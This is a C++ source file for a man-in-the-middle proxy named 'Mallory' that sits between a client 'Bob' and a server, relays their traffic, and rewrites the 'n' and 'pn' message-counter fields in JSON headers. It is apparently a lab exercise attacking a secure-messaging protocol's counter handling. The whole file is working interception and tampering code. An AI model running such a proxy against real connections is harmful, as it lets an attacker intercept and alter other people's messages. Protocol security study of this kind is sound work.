#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>   // or use thread
#include <string>
#include <iostream>
#include <thread>
using namespace std;

bool read_line(int sock, string &line) { //because we want to read complete line from json, normal read() may not read complete line.
    line.clear();
    char c;
    while (true) {
        ssize_t n = recv(sock, &c, 1, 0);
        if (n <= 0) {
            return false; // connection closed or error
        }
        if (c == '\n') {
            break; // end of line
        }
        line += c;
    }
    return true;
}

string tamper_messagge_counter(const string& original, int new_n, int new_pn){
    string modified = original;

    size_t pos = modified.find("\"n\":");
    if (pos != string::npos) {
        size_t start = modified.find_first_of("0123456789", pos);
        if (start != string::npos) {
            size_t end = modified.find_first_not_of("0123456789", start);
            modified.replace(start, end - start, to_string(new_n));
        }
    }

    pos = modified.find("\"pn\":");
    if (pos != string::npos) {
        size_t start = modified.find_first_of("0123456789", pos);
        if (start != string::npos) {
            size_t end = modified.find_first_not_of("0123456789", start);
            modified.replace(start, end - start, to_string(new_pn));
        }
    }
    return modified;
}

void forward_bob_to_server(int client_sock, int server_sock) {
    string line;
    while (read_line(client_sock, line)) {
        //cout << "Mallory Forwarding from Bob to Server: " << line << endl;
        line += '\n'; // Add newline back
        ssize_t sent = write(server_sock, line.c_str(), line.size());
        if (sent < 0) {
            perror("write to server failed");
            break;
        }
    }
    cout << "Bob disconnected" << endl;
    shutdown(server_sock, SHUT_RDWR); // Close the write end to server
    
}

void forward_server_to_bob(int server_sock, int client_sock, int n_value, int pn_value){
    string line;
    while (read_line(server_sock, line)) {
        if(line.find("\"header\"") != string::npos){
            line = tamper_messagge_counter(line, n_value, pn_value);
            cout << "Mallory Forwarding from Server to Bob (modified): " << line << endl;
        }
        // else{
        //     cout << "Mallory Forwarding from Server to Bob: " << line << endl;
        // }
        line += '\n'; // Add newline back
        ssize_t sent = write(client_sock, line.c_str(), line.size());
        if (sent < 0) {
            perror("write to Bob failed");
            break;
        }
    }
    cout << "Server disconnected" << endl;
    shutdown(client_sock, SHUT_RDWR); // Close the write end to Bob
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        cerr << "Usage: " << argv[0] << " <listen_port> <server_address> <server_port> <n-value> <pn-value>" << endl;
        return 1;
    }
    int listen_port = stoi(argv[1]);
    const char* server_address = argv[2];
    int server_port = stoi(argv[3]);
    int n_value = stoi(argv[4]);
    int pn_value = stoi(argv[5]);

    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_sock < 0) {
        perror("socket");
        return 1;
    }

    struct sockaddr_in listen_addr;
    listen_addr.sin_family = AF_INET;
    listen_addr.sin_addr.s_addr = INADDR_ANY;
    listen_addr.sin_port = htons(listen_port);

    int opt = 1;
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    if(bind(listen_sock, (struct sockaddr*)&listen_addr, sizeof(listen_addr)) < 0) {
        perror("bind failed");
        return 1;
    }

    if(listen(listen_sock, 1) < 0) {
        perror("listen failed");
        return 1;
    }

    cout << "Listening on port " << listen_port << " for Bob" << endl;
    
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    int client_sock = accept(listen_sock, (struct sockaddr*)&client_addr, &client_len);
    if (client_sock < 0) {
        perror("accept failed");
        return 1;
    }

    cout << "Bob connected" << endl;

    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror("server socket failed");
        return 1;
    }

    struct sockaddr_in server_target_addr;
    server_target_addr.sin_family = AF_INET;
    server_target_addr.sin_port = htons(server_port);
    if(inet_pton(AF_INET, server_address, &server_target_addr.sin_addr) <= 0) {
        perror("Invalid server address/ Address not supported");
        return 1;
    }

    if (connect(server_sock, (struct sockaddr*)&server_target_addr, sizeof(server_target_addr)) < 0) {
        perror("connect to server failed");
        return 1;
    }

    cout << "Connected to server at " << server_address << ":" << server_port << endl;
    
    thread thread_b(forward_bob_to_server, client_sock, server_sock);
    thread thread_a(forward_server_to_bob, server_sock, client_sock, n_value, pn_value);
    
    thread_b.join();
    thread_a.join();

    close(client_sock);
    close(server_sock);
    close(listen_sock);
    
    return 0;
}